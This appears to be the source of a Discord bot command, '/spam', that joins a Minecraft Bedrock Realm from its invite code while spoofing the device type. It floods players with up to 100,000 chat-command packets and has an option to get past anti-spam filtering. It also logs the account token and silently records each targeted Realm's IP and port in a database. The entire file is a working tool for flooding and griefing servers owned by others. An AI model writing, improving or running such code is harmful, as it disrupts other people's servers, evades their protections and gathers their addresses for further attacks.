const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder } = require('discord.js');

const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const accseptEmoji = '<a:Check:1256612972793565204>';
const errorEmoji = '<:deny:1256622572762562681>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';
const trollEmojie = "<:HDtroll:1246615956176769024>";
const loadingemoji = "<a:loading:1256535355138768906>";

// Generierung eines zufälligen Minecraft-Farbcodes
function randomCode() {
    const optionsString = "1234567890abcdef";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    return "§" + optionsArray[randomIndex];
}

function applyRainbowEffect(message) {
    return message.split('').map(char => randomCode() + char).join('');
}

function generateAntiSpamCode() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let code = '';
    for (let i = 0; i < 8; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        code += chars[randomIndex];
    }
    return code;
}

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const databasePath = path.join(__dirname, '..', '..', 'data', 'database.json');

let blacklistedUsers = new Set();
try {
    const blacklistData = fs.readFileSync(blacklistPath, 'utf-8');
    blacklistedUsers = new Set(JSON.parse(blacklistData));
} catch (error) {
    console.error('Fehler beim Laden der Blacklist:', error);
}

async function addRealmCode(realmCode, name, id, host, port) {
    let databaseData = fs.readFileSync(databasePath, 'utf-8');
    let database = databaseData.trim() ? JSON.parse(databaseData) : [];

    if (database.some(entry => entry['Realm Code'] === realmCode)) {
        console.log('Dieser Code existiert bereits in der Datenbank.');
        return;
    }

    database.push({ Name: name, "Realm Code": realmCode, "Realm ID": id, IP: host, Port: port });
    fs.writeFileSync(databasePath, JSON.stringify(database, null, 2));
    console.log('Der Code und die zugehörigen Informationen wurden zur Datenbank hinzugefügt.');
}

// Hauptmodul-Export
module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
                .setMaxLength(11)
        )
        .addStringOption(option =>
            option.setName('custommessage')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('target')
                .setDescription('The target for the spam')
                .setRequired(true)
                .addChoices(
                    { name: 'All players (@a)', value: '@a' },
                    { name: 'Nearest player (@p)', value: '@p' },
                    { name: 'Random player (@r)', value: '@r' }
                )
        )
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('the device to spoof as')
                .setRequired(true)
                .addChoices(
                    { name: 'Android', value: 'android' },
                    { name: 'iOS', value: 'ios' },
                    { name: 'Windows 10', value: 'win10' }
                )
        )
        .addIntegerOption(option =>
            option.setName('packets')
                .setDescription('Number of packets to send')
                .setRequired(true)
                .addChoices(
                    { name: '10K', value: 10000 },
                    { name: '50K', value: 50000 },
                    { name: '100K', value: 100000 }
                )
        )
        .addBooleanOption(option =>
            option.setName('rainbow')
                .setDescription('Apply rainbow effect to the message')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('antispambypass')
                .setDescription('Add an anti-spam bypass code to the message')
                .setRequired(false)
        ),
    callback: async (interaction) => {
        if (blacklistedUsers.has(interaction.user.id)) {
            const embed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('Access Denied')
                .setDescription(`${errorEmoji} You are blacklisted from using this command.`); // Add a description to the embed
            await interaction.reply({ embeds: [embed], ephemeral: true });
            return;
        }

        const userIdentifier = 'unique_identifier';
        const cacheDir = './';
        const flow = new Authflow(userIdentifier, cacheDir);

        try {
            const realmCode = interaction.options.getString('realmcode');
            let customMessage = interaction.options.getString('custommessage');
            const target = interaction.options.getString('target');
            const deviceOS = interaction.options.getString('device_os');
            const packetCount = interaction.options.getInteger('packets');
            const rainbow = interaction.options.getBoolean('rainbow') || false;
            const antiSpamBypass = interaction.options.getBoolean('antispambypass') || false;

            if (rainbow) {
                customMessage = applyRainbowEffect(customMessage);
            }

            if (antiSpamBypass) {
                customMessage += ` ${generateAntiSpamCode()}`;
            }

            let statusEmbed = new EmbedBuilder()
                .setTitle(`${trollEmojie} User Spam ${trollEmojie}`)
                .setDescription(`${second} Target : ${target}\n${one}Custom Message: ${customMessage}`)
                .setTimestamp()
                .setColor(0xFF0000)
                .addFields(
                    { name: 'Device', value: deviceOS, inline: false },
                    { name: 'Connected', value: loadingemoji, inline: false },
                    { name: 'Spammed', value: loadingemoji, inline: false },
                    { name: 'Disconnected', value: loadingemoji, inline: false }
                )
                .setFooter({ text: `/spam | Command used by ${interaction.user.username}`, iconURL: interaction.user.avatarURL() });

            await interaction.reply({ embeds: [statusEmbed], ephemeral: true });

            const token = await flow.getMinecraftJavaToken();
            console.log('Token obtained:', token);

            const client = bedrock.createClient({
                authFlow: flow,
                deviceOS: deviceOS,
                realms: {
                    realmInvite: `https://realms.gg/${realmCode}`
                }
            });

            client.on('join', async () => {
                const profilesFolder = './';
                const options = {
                    authTitle: '00000000441cc96b',
                    flow: 'live'
                };

                const userIdentifier = 'unique_identifier'; 
                const authFlow = new Authflow(userIdentifier, profilesFolder, options);
                const api = RealmAPI.from(authFlow, 'bedrock');

                statusEmbed = statusEmbed
                    .spliceFields(1, 1, { name: 'Connected', value: accseptEmoji, inline: false });

                interaction.editReply({ embeds: [statusEmbed], ephemeral: true });

                console.log(`Joined the realm with code ${realmCode}`);

                setTimeout(() => {
                    spamMessages(client, target, customMessage, packetCount);
                    console.log('Spammed Chat');
                    console.log(`Spammed with ${customMessage}`);

                    statusEmbed = statusEmbed
                        .spliceFields(2, 1, { name: 'Spammed', value: accseptEmoji, inline: false });

                    interaction.editReply({ embeds: [statusEmbed], ephemeral: true });

                    setTimeout(() => {
                        client.disconnect();

                        statusEmbed = statusEmbed
                            .spliceFields(3, 1, { name: 'Disconnected', value: accseptEmoji, inline: false });
                        interaction.editReply({ embeds: [statusEmbed] });
                        console.log(`Disconnected from ${realmCode}`);
                    }, 3000); // Warte 3 Sekunden bevor die Verbindung getrennt wird
                }, 4000); // Warte 4 Sekunden bevor der Spam startet

                // Realm zur Datenbank hinzufügen
                const realmData = await api.getRealmFromInvite(realmCode);
                const address = await realmData.getAddress();
                await addRealmCode(realmCode, realmData.name, realmData.id, address.host, address.port);
            });

            client.on('error', (err) => {
                console.error('Fehler beim Verbinden zum Realm:', err);
                const errorEmbed = new EmbedBuilder()
                    .setTitle('Error')
                    .setDescription(`${errorEmoji} Error while adding Realm :\n ${err.message}`)
                    .setColor('Red');

                interaction.editReply({ embeds: [errorEmbed] });
            });
        } catch (error) {
            console.error('Fehler beim Ausführen des Befehls:', error);
            const errorEmbed = new EmbedBuilder()
                .setTitle('Error')
                .setDescription(`${errorEmoji} Errors Spamming Realm ${errorEmoji} \n ${error}`)
                .setColor('Red');

            interaction.reply({ embeds: [errorEmbed], ephemeral: true });
        }
    }
};

function spamMessages(client, target, message, packetCount) {
    for (let i = 0; i < packetCount; i++) {
        client.queue('command_request', {
            command: `tell ${target} ${message}`,
            internal: false,
            version: 66,
            origin: {
                type: 5,
                uuid: "",
                request_id: ""
            }
        });
    }
}
